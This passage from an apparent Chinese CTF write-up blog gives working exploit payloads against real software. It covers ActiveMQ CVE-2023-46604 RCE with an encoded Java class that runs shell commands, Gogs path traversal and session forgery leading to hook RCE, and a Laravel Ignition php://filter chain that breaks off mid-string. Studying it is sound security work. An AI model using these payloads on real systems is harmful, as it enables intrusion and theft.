RISmxZVzBvS1NrS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM1MWMyVkVaV3hwYldsMFpYSW9JbHhjUVNJcENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdWJtVjRkQ2dwQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F1WjJWMFFubDBaWE1vS1RzS0lDQWdJQ0FnSUNCVGRISnBibWNnYldWemMyRm5aU0E5SUc1bGR5QlRkSEpwYm1jb1luTXBPd29nSUNBZ0lDQWdJRlJsZUhSTlpYTnpZV2RsSUcxelp5QTlJSEIxWWxObGMzTnBiMjR1WTNKbFlYUmxWR1Y0ZEUxbGMzTmhaMlVvS1RzS0lDQWdJQ0FnSUNCdGMyY3VjMlYwVkdWNGRDaHRaWE56WVdkbEtUc0tJQ0FnSUNBZ0lDQndkV0pzYVhOb1pYSXVjMlZ1WkNodGMyY3BPd29nSUNBZ0lDQWdJRk41YzNSbGJTNXZkWFF1Y0hKcGJuUnNiaWdpY0hWaWJHbHphQ0JtYVc1cGMyaGxaQ0lwT3dvZ0lDQWdJQ0FnSUdOdmJtNWxZM1JwYjI0dVkyeHZjMlVvS1RzS0lDQWdJSDBLQ2lBZ0lDQndjbWwyWVhSbElIWnZhV1FnWTI5dWMzVnRaU2dwSUhSb2NtOTNjeUJGZUdObGNIUnBiMjRnZXdvZ0lDQWdJQ0FnSUVOdmJtNWxZM1JwYjI1R1lXTjBiM0o1SUdaaFkzUnZjbmtnUFNCdVpYY2dRV04wYVhabFRWRkRiMjV1WldOMGFXOXVSbUZqZEc5eWVTZ2lkR053T2k4dmVIaDRPall4TmpFMklpazdDaUFnSUNBZ0lDQWdRMjl1Ym1WamRHbHZiaUJqYjI1dVpXTjBhVzl1SUQwZ1ptRmpkRzl5ZVM1amNtVmhkR1ZEYjI1dVpXTjBhVzl1S0NrN0NpQWdJQ0FnSUNBZ1UyVnpjMmx2YmlCemRXSlRaWE56YVc5dUlEMGdZMjl1Ym1WamRHbHZiaTVqY21WaGRHVlRaWE56YVc5dUtHWmhiSE5sTENCVFpYTnphVzl1TGtGVlZFOWZRVU5MVGs5WFRFVkVSMFVwT3dvZ0lDQWdJQ0FnSUZGMVpYVmxJSEYxWlhWbElEMGdjM1ZpVTJWemMybHZiaTVqY21WaGRHVlJkV1YxWlNnaVpteGhaM0YxWlhWbElpazdDaUFnSUNBZ0lDQWdUV1Z6YzJGblpVTnZibk4xYldWeUlITjFZbk5qY21saVpYSWdQU0J6ZFdKVFpYTnphVzl1TG1OeVpXRjBaVU52Ym5OMWJXVnlLSEYxWlhWbEtUc0tJQ0FnSUNBZ0lDQnpkV0p6WTNKcFltVnlMbk5sZEUxbGMzTmhaMlZNYVhOMFpXNWxjaWgwYUdsektUc0tJQ0FnSUNBZ0lDQmpiMjV1WldOMGFXOXVMbk4wWVhKMEtDazdDaUFnSUNCOUNnb0tJQ0FnSUhCMVlteHBZeUJ6ZEdGMGFXTWdkbTlwWkNCdFlXbHVLRk4wY21sdVoxdGRJR0Z5WjNNcElIUm9jbTkzY3lCRmVHTmxjSFJwYjI0Z2V3b2dJQ0FnSUNBZ0lFMWhhVzRnYldGcGJpQTlJRzVsZHlCTllXbHVLQ2s3Q2lBZ0lDQWdJQ0FnSUcxaGFXNHVjSFZpYkdsemFDZ3BPd29nSUNBZ2ZRb0tJQ0FnSUVCUGRtVnljbWxrWlFvZ0lDQWdjSFZpYkdsaklIWnZhV1FnYjI1TlpYTnpZV2RsS0UxbGMzTmhaMlVnYldWemMyRm5aU2tnZXdvZ0lDQWdJQ0FnSUhSeWVTQjdDaUFnSUNBZ0lDQWdJQ0FnSUZONWMzUmxiUzV2ZFhRdWNISnBiblJzYmlnaVVtVmpaV2wyWldRZ0lpQXJJQ2dvVkdWNGRFMWxjM05oWjJVcElHMWxjM05oWjJVcExtZGxkRlJsZUhRb0tTazdDaUFnSUNBZ0lDQWdmU0JqWVhSamFDQW9SWGhqWlhCMGFXOXVJR1VwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdaUzV3Y21sdWRGTjBZV05yVkhKaFkyVW9LVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQjlDbjBnSUNBS3xiYXNlNjQgLWQgPi90bXAvTWFpbi5jbGFzcyJdfQ==</span><br></pre></td></tr></table></figure>
<p><code>java -cp /opt/apache-activemq/lib/optional/*:/tmp/:/opt/apache-activemq/activemq-all-5.17.5.jar Main</code><br>然后顺着上面X1roz师傅的poc，我们可以改为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsiZWNobyBhVzF3YjNKMElHOXlaeTVoY0dGamFHVXVZV04wYVhabGJYRXVRV04wYVhabFRWRkRiMjV1WldOMGFXOXVSbUZqZEc5eWVUc0thVzF3YjNKMElHcGhkbUY0TG1wdGN5NHFPd29LY0hWaWJHbGpJR05zWVhOeklFMWhhVzRnYVcxd2JHVnRaVzUwY3lCTlpYTnpZV2RsVEdsemRHVnVaWElnZXdvZ0lDQWdjSEpwZG1GMFpTQjJiMmxrSUhCMVlteHBjMmdvS1NCMGFISnZkM01nUlhoalpYQjBhVzl1SUhzS0lDQWdJQ0FnSUNCcVlYWmhlQzVxYlhNdVEyOXVibVZqZEdsdmJrWmhZM1J2Y25rZ1ptRmpkRzl5ZVRzS0lDQWdJQ0FnSUNCbVlXTjBiM0o1SUQwZ2JtVjNJRUZqZEdsMlpVMVJRMjl1Ym1WamRHbHZia1poWTNSdmNua29JblJqY0Rvdkx6RXlOeTR3TGpBdU1UbzJNVFl4TmlJcE93b2dJQ0FnSUNBZ0lFTnZibTVsWTNScGIyNGdZMjl1Ym1WamRHbHZiaUE5SUdaaFkzUnZjbmt1WTNKbFlYUmxRMjl1Ym1WamRHbHZiaWdwT3dvZ0lDQWdJQ0FnSUZObGMzTnBiMjRnY0hWaVUyVnpjMmx2YmlBOUlHTnZibTVsWTNScGIyNHVZM0psWVhSbFUyVnpjMmx2YmlobVlXeHpaU3dnVTJWemMybHZiaTVCVlZSUFgwRkRTMDVQVjB4RlJFZEZLVHNLSUNBZ0lDQWdJQ0JSZFdWMVpTQnhkV1YxWlNBOUlIQjFZbE5sYzNOcGIyNHVZM0psWVhSbFVYVmxkV1VvSW1ac1lXZHhkV1YxWlNJcE93b2dJQ0FnSUNBZ0lFMWxjM05oWjJWUWNtOWtkV05sY2lCd2RXSnNhWE5vWlhJZ1BTQndkV0pUWlhOemFXOXVMbU55WldGMFpWQnliMlIxWTJWeUtIRjFaWFZsS1RzS0lDQWdJQ0FnSUNCVGRISnBibWRiWFNCamJXUWdQU0J1WlhjZ1UzUnlhVzVuVzExN0lpOWlhVzR2YzJnaUxDSXRZeUlzSW1OaGRDQXZabXhoWnlKOU93b2dJQ0FnSUNBZ0lHSjVkR1ZiWFNCaWN5QTlJRzVsZHlCVFkyRnVibVZ5S0c1bGR5QlFjbTlqWlhOelFuVnBiR1JsY2loamJXUXBMbk4wWVhKMEtDa3VaMlYwU1c1d2RYUlRkSEpsWVcwb0tTa0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDNTFjMlZFWld4cGJXbDBaWElvSWx4Y1FTSXBDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXVibVY0ZENncENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdVoyVjBRbmwwWlhNb0tUc0tJQ0FnSUNBZ0lDQlRkSEpwYm1jZ2JXVnpjMkZuWlNBOUlHNWxkeUJUZEhKcGJtY29Zbk1wT3dvZ0lDQWdJQ0FnSUZSbGVIUk5aWE56WVdkbElHMXpaeUE5SUhCMVlsTmxjM05wYjI0dVkzSmxZWFJsVkdWNGRFMWxjM05oWjJVb0tUc0tJQ0FnSUNBZ0lDQnRjMmN1YzJWMFZHVjRkQ2h0WlhOellXZGxLVHNLSUNBZ0lDQWdJQ0J3ZFdKc2FYTm9aWEl1YzJWdVpDaHRjMmNwT3dvZ0lDQWdJQ0FnSUZONWMzUmxiUzV2ZFhRdWNISnBiblJzYmlnaWNIVmliR2x6YUNCbWFXNXBjMmhsWkNJcE93b2dJQ0FnSUNBZ0lHTnZibTVsWTNScGIyNHVZMnh2YzJVb0tUc0tJQ0FnSUgwS0NpQWdJQ0J3Y21sMllYUmxJSFp2YVdRZ1kyOXVjM1Z0WlNncElIUm9jbTkzY3lCRmVHTmxjSFJwYjI0Z2V3b2dJQ0FnSUNBZ0lFTnZibTVsWTNScGIyNUdZV04wYjNKNUlHWmhZM1J2Y25rZ1BTQnVaWGNnUVdOMGFYWmxUVkZEYjI1dVpXTjBhVzl1Um1GamRHOXllU2dpZEdOd09pOHZlSGg0T2pZeE5qRTJJaWs3Q2lBZ0lDQWdJQ0FnUTI5dWJtVmpkR2x2YmlCamIyNXVaV04wYVc5dUlEMGdabUZqZEc5eWVTNWpjbVZoZEdWRGIyNXVaV04wYVc5dUtDazdDaUFnSUNBZ0lDQWdVMlZ6YzJsdmJpQnpkV0pUWlhOemFXOXVJRDBnWTI5dWJtVmpkR2x2Ymk1amNtVmhkR1ZUWlhOemFXOXVLR1poYkhObExDQlRaWE56YVc5dUxrRlZWRTlmUVVOTFRrOVhURVZFUjBVcE93b2dJQ0FnSUNBZ0lGRjFaWFZsSUhGMVpYVmxJRDBnYzNWaVUyVnpjMmx2Ymk1amNtVmhkR1ZSZFdWMVpTZ2labXhoWjNGMVpYVmxJaWs3Q2lBZ0lDQWdJQ0FnVFdWemMyRm5aVU52Ym5OMWJXVnlJSE4xWW5OamNtbGlaWElnUFNCemRXSlRaWE56YVc5dUxtTnlaV0YwWlVOdmJuTjFiV1Z5S0hGMVpYVmxLVHNLSUNBZ0lDQWdJQ0J6ZFdKelkzSnBZbVZ5TG5ObGRFMWxjM05oWjJWTWFYTjBaVzVsY2loMGFHbHpLVHNLSUNBZ0lDQWdJQ0JqYjI1dVpXTjBhVzl1TG5OMFlYSjBLQ2s3Q2lBZ0lDQjlDZ29LSUNBZ0lIQjFZbXhwWXlCemRHRjBhV01nZG05cFpDQnRZV2x1S0ZOMGNtbHVaMXRkSUdGeVozTXBJSFJvY205M2N5QkZlR05sY0hScGIyNGdld29nSUNBZ0lDQWdJRTFoYVc0Z2JXRnBiaUE5SUc1bGR5Qk5ZV2x1S0NrN0NpQWdJQ0FnSUNBZ0lHMWhhVzR1Y0hWaWJHbHphQ2dwT3dvZ0lDQWdmUW9LSUNBZ0lFQlBkbVZ5Y21sa1pRb2dJQ0FnY0hWaWJHbGpJSFp2YVdRZ2IyNU5aWE56WVdkbEtFMWxjM05oWjJVZ2JXVnpjMkZuWlNrZ2V3b2dJQ0FnSUNBZ0lIUnllU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lGTjVjM1JsYlM1dmRYUXVjSEpwYm5Sc2JpZ2lVbVZqWldsMlpXUWdJaUFySUNnb1ZHVjRkRTFsYzNOaFoyVXBJRzFsYzNOaFoyVXBMbWRsZEZSbGVIUW9LU2s3Q2lBZ0lDQWdJQ0FnZlNCallYUmphQ0FvUlhoalpYQjBhVzl1SUdVcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnWlM1d2NtbHVkRk4wWVdOclZISmhZMlVvS1RzS0lDQWdJQ0FnSUNCOUNpQWdJQ0I5Q24wZ0lDQUt8YmFzZTY0IC1kID4vdG1wL01haW4uY2xhc3MiLCJlY2hvIGFXMXdiM0owSUc5eVp5NWhjR0ZqYUdVdVlXTjBhWFpsYlhFdVFXTjBhWFpsVFZGRGIyNXVaV04wYVc5dVJtRmpkRzl5ZVRzS2FXMXdiM0owSUdwaGRtRjRMbXB0Y3k0cU93b0tjSFZpYkdsaklHTnNZWE56SUUxaGFXNGdhVzF3YkdWdFpXNTBjeUJOWlhOellXZGxUR2x6ZEdWdVpYSWdld29nSUNBZ2NISnBkbUYwWlNCMmIybGtJSEIxWW14cGMyZ29LU0IwYUhKdmQzTWdSWGhqWlhCMGFXOXVJSHNLSUNBZ0lDQWdJQ0JxWVhaaGVDNXFiWE11UTI5dWJtVmpkR2x2YmtaaFkzUnZjbmtnWm1GamRHOXllVHNLSUNBZ0lDQWdJQ0JtWVdOMGIzSjVJRDBnYm1WM0lFRmpkR2wyWlUxUlEyOXVibVZqZEdsdmJrWmhZM1J2Y25rb0luUmpjRG92THpFeU55NHdMakF1TVRvMk1UWXhOaUlwT3dvZ0lDQWdJQ0FnSUVOdmJtNWxZM1JwYjI0Z1kyOXVibVZqZEdsdmJpQTlJR1poWTNSdmNua3VZM0psWVhSbFEyOXVibVZqZEdsdmJpZ3BPd29nSUNBZ0lDQWdJRk5sYzNOcGIyNGdjSFZpVTJWemMybHZiaUE5SUdOdmJtNWxZM1JwYjI0dVkzSmxZWFJsVTJWemMybHZiaWhtWVd4elpTd2dVMlZ6YzJsdmJpNUJWVlJQWDBGRFMwNVBWMHhGUkVkRktUc0tJQ0FnSUNBZ0lDQlJkV1YxWlNCeGRXVjFaU0E5SUhCMVlsTmxjM05wYjI0dVkzSmxZWFJsVVhWbGRXVW9JbVpzWVdkeGRXVjFaU0lwT3dvZ0lDQWdJQ0FnSUUxbGMzTmhaMlZRY205a2RXTmxjaUJ3ZFdKc2FYTm9aWElnUFNCd2RXSlRaWE56YVc5dUxtTnlaV0YwWlZCeWIyUjFZMlZ5S0hGMVpYVmxLVHNLSUNBZ0lDQWdJQ0JUZEhKcGJtZGJYU0JqYldRZ1BTQnVaWGNnVTNSeWFXNW5XMTE3SWk5aWFXNHZjMmdpTENJdFl5SXNJbU5oZENBdlpteGhaeUo5T3dvZ0lDQWdJQ0FnSUdKNWRHVmJYU0JpY3lBOUlHNWxkeUJUWTJGdWJtVnlLRzVsZHlCUWNtOWpaWE56UW5WcGJHUmxjaWhqYldRcExuTjBZWEowS0NrdVoyVjBTVzV3ZFhSVGRISmxZVzBvS1NrS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM1MWMyVkVaV3hwYldsMFpYSW9JbHhjUVNJcENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdWJtVjRkQ2dwQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F1WjJWMFFubDBaWE1vS1RzS0lDQWdJQ0FnSUNCVGRISnBibWNnYldWemMyRm5aU0E5SUc1bGR5QlRkSEpwYm1jb1luTXBPd29nSUNBZ0lDQWdJRlJsZUhSTlpYTnpZV2RsSUcxelp5QTlJSEIxWWxObGMzTnBiMjR1WTNKbFlYUmxWR1Y0ZEUxbGMzTmhaMlVvS1RzS0lDQWdJQ0FnSUNCdGMyY3VjMlYwVkdWNGRDaHRaWE56WVdkbEtUc0tJQ0FnSUNBZ0lDQndkV0pzYVhOb1pYSXVjMlZ1WkNodGMyY3BPd29nSUNBZ0lDQWdJRk41YzNSbGJTNXZkWFF1Y0hKcGJuUnNiaWdpY0hWaWJHbHphQ0JtYVc1cGMyaGxaQ0lwT3dvZ0lDQWdJQ0FnSUdOdmJtNWxZM1JwYjI0dVkyeHZjMlVvS1RzS0lDQWdJSDBLQ2lBZ0lDQndjbWwyWVhSbElIWnZhV1FnWTI5dWMzVnRaU2dwSUhSb2NtOTNjeUJGZUdObGNIUnBiMjRnZXdvZ0lDQWdJQ0FnSUVOdmJtNWxZM1JwYjI1R1lXTjBiM0o1SUdaaFkzUnZjbmtnUFNCdVpYY2dRV04wYVhabFRWRkRiMjV1WldOMGFXOXVSbUZqZEc5eWVTZ2lkR053T2k4dmVIaDRPall4TmpFMklpazdDaUFnSUNBZ0lDQWdRMjl1Ym1WamRHbHZiaUJqYjI1dVpXTjBhVzl1SUQwZ1ptRmpkRzl5ZVM1amNtVmhkR1ZEYjI1dVpXTjBhVzl1S0NrN0NpQWdJQ0FnSUNBZ1UyVnpjMmx2YmlCemRXSlRaWE56YVc5dUlEMGdZMjl1Ym1WamRHbHZiaTVqY21WaGRHVlRaWE56YVc5dUtHWmhiSE5sTENCVFpYTnphVzl1TGtGVlZFOWZRVU5MVGs5WFRFVkVSMFVwT3dvZ0lDQWdJQ0FnSUZGMVpYVmxJSEYxWlhWbElEMGdjM1ZpVTJWemMybHZiaTVqY21WaGRHVlJkV1YxWlNnaVpteGhaM0YxWlhWbElpazdDaUFnSUNBZ0lDQWdUV1Z6YzJGblpVTnZibk4xYldWeUlITjFZbk5qY21saVpYSWdQU0J6ZFdKVFpYTnphVzl1TG1OeVpXRjBaVU52Ym5OMWJXVnlLSEYxWlhWbEtUc0tJQ0FnSUNBZ0lDQnpkV0p6WTNKcFltVnlMbk5sZEUxbGMzTmhaMlZNYVhOMFpXNWxjaWgwYUdsektUc0tJQ0FnSUNBZ0lDQmpiMjV1WldOMGFXOXVMbk4wWVhKMEtDazdDaUFnSUNCOUNnb0tJQ0FnSUhCMVlteHBZeUJ6ZEdGMGFXTWdkbTlwWkNCdFlXbHVLRk4wY21sdVoxdGRJR0Z5WjNNcElIUm9jbTkzY3lCRmVHTmxjSFJwYjI0Z2V3b2dJQ0FnSUNBZ0lFMWhhVzRnYldGcGJpQTlJRzVsZHlCTllXbHVLQ2s3Q2lBZ0lDQWdJQ0FnSUcxaGFXNHVjSFZpYkdsemFDZ3BPd29nSUNBZ2ZRb0tJQ0FnSUVCUGRtVnljbWxrWlFvZ0lDQWdjSFZpYkdsaklIWnZhV1FnYjI1TlpYTnpZV2RsS0UxbGMzTmhaMlVnYldWemMyRm5aU2tnZXdvZ0lDQWdJQ0FnSUhSeWVTQjdDaUFnSUNBZ0lDQWdJQ0FnSUZONWMzUmxiUzV2ZFhRdWNISnBiblJzYmlnaVVtVmpaV2wyWldRZ0lpQXJJQ2dvVkdWNGRFMWxjM05oWjJVcElHMWxjM05oWjJVcExtZGxkRlJsZUhRb0tTazdDaUFnSUNBZ0lDQWdmU0JqWVhSamFDQW9SWGhqWlhCMGFXOXVJR1VwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdaUzV3Y21sdWRGTjBZV05yVkhKaFkyVW9LVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQjlDbjBnSUNBS3xiYXNlNjQgLWQgPi90bXAvTWFpbi5jbGFzcyJdfQ==&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">   <span class="built_in">this</span>.wireFormat.marshal(response, <span class="built_in">this</span>.dataOut);</span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">MessageListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      javax.jms.ConnectionFactory factory;</span><br><span class="line">        factory = <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://127.0.0.1:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">pubSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> pubSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">publisher</span> <span class="operator">=</span> pubSession.createProducer(queue);</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /flag&quot;</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] bs = <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream())</span><br><span class="line">                .useDelimiter(<span class="string">&quot;\\A&quot;</span>)</span><br><span class="line">                .next()</span><br><span class="line">                .getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bs);</span><br><span class="line">        <span class="type">TextMessage</span> <span class="variable">msg</span> <span class="operator">=</span> pubSession.createTextMessage();</span><br><span class="line">        msg.setText(message);</span><br><span class="line">        publisher.send(msg);</span><br><span class="line">        System.out.println(<span class="string">&quot;publish finished&quot;</span>);</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>写到这里去把ApacheMQ的漏洞学完了一遍，很精彩。地址在这<br><a href="https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/">https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/</a><br>那么我们接下来只需要仿照上述的poc进行ssrf即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698947016409-5dc05b58-5e4c-477c-947e-42baf3cd0e29.png#averageHue=%234b5057&clientId=ubda073b9-0366-4&from=paste&height=214&id=u456087df&originHeight=268&originWidth=1856&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=446821&status=done&style=none&taskId=u3ac33ac3-788a-4e02-bc9f-6194059e585&title=&width=1484.8" alt="image.png"><br>复现起来过于麻烦- -到这一步就可以了，其实这个不出网就很多余捏<br>你把ApacheMQ放外头，port放里头不映射端口不也是一样的吗</p>
<h1 id="ggbond’s-gogs"><a href="#ggbond’s-gogs" class="headerlink" title="ggbond’s gogs"></a>ggbond’s gogs</h1><p>U1S1不是特别想看，只是单纯的贴个wp的内容<br>参考：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbond's%20ggos">N1CTF 2023 writeup</a><br>internal&#x2F;db&#x2F;repo_editor.go UpdateRepoFile 函数，之前爆过 NewTreeName 参数的目录穿越写 .git&#x2F;config RCE，修了之后<br>NewTreeName 加了过滤。<br>观察 OldTreeName 参数，从 Web 接口访问时是从数据库取的 c.Repo.TreePath，从 API 接口 PUT &#x2F;repos&#x2F;:username&#x2F;:reponame&#x2F;contents&#x2F;* 访问时，是直接 c.Param(“*”) 从路由中取的。所以传入 ..&#x2F;..&#x2F; 可以目录穿越任意文件写。<br>直接本地起一个 Gogs，ID 1 管理员名称为 root。默认 Session 存文件，将管理员 Session Base64 后发送请求写 Session 文件到指定目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dv+BBAEC/4IAARABEAAAWv+CAAMGc3RyaW5nDAcABXVuYW1lBnN0cmluZwwGAARyb290BnN0cmluZwwKAAhfb2xkX3VpZAZzdHJpbmcMAwABMQZzdHJpbmcMBQADdWlkBWludDY0BAIAAg==</span><br></pre></td></tr></table></figure>
<p>普通账户后台建一个 API Token，调用 API：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1699104335202-ca3c90e7-263e-446d-b7ce-6d38820f2008.png#averageHue=%23f3f3f3&clientId=ubad6c121-9c72-4&from=paste&id=u2911dca4&originHeight=457&originWidth=1080&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u978bb5ea-2eba-4afe-ba07-d5279278771&title="><br>用 Cookie f01f9038fe591924 登入管理员账号，给任意一个仓库配置 Git pre-receive 钩子，然后再向这个仓库上传文件，即可触发钩子的命令实现 RCE。用 curl 将 flag 带出来：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1699104335269-a9044fa7-421a-441d-805e-f118c25d44b9.png#averageHue=%23f6f5f4&clientId=ubad6c121-9c72-4&from=paste&id=u1626f360&originHeight=503&originWidth=1080&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u9056134b-9b43-40ac-8c9b-2445aea6b00&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1699104335261-22123e0d-781c-4421-9523-bbf10fd34a57.png#averageHue=%234d4d4c&clientId=ubad6c121-9c72-4&from=paste&id=uaaa634b4&originHeight=400&originWidth=696&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u4da2468c-b786-4d89-b0f8-757ac20295e&title="><br>我真勤劳（我是懒狗）</p>
<h1 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h1><p>P神知识星球里的一个filterchain无文件方法<br>直接覆盖那个index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|